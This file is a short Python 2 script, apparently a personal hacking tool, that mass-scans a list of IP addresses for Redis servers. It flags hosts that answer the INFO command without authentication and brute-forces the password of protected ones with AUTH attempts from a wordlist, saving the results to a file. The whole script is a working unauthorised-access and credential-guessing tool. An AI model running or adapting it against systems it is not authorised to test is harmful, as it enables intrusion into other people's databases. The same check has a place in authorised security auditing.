# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import socket
socket.setdefaulttimeout(5)
import multiprocessing
import ConfigParser
def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")

def brute_redis(ip,username,passwords,port):
    print 'SCAN REDIS:'+str(ip)
    try:
        s = socket.socket()
        s.connect((str(ip), 6379))
        s.send("INFO\r\n")
        result = s.recv(1024)
        # 此处应有检测代码
        if "redis_version" in result:
            # 此处应有成功后结果
            success('Redis数据库未授权访问漏洞 : ' + str(ip) + ':'+str(6379))
            return 'red'
    except Exception, e:
        pass
    finally:
        s.close()


    try:
        s = socket.socket()
        s.connect((ip, int(port)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "Authentication" in result:
            for pass_ in passwords:
                s = socket.socket()
                s.connect((ip, int(port)))
                s.send("AUTH %s\r\n" % (pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    success('Redis弱口令漏洞 : ' + str(ip) + ':'+str(port)+'|' + str(pass_))
                    return 'red'
    except Exception, e:
        pass
    finally:
        s.close()

if __name__ == '__main__':
    multiprocessing.freeze_support()

    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))
    print '\n\n     REDIS SCAN'
    print '         USER:' + user
    print 'there is no need username'
    print '         PORT:' + str(port)
    print '         THREADS:' + str(thread_s)

    New_start = raw_input('INPUT IP LIST TXT:')  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt','r').readlines()]))

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(brute_redis, args=(ip,user,Password_list_,port))
    p.close()
    p.join()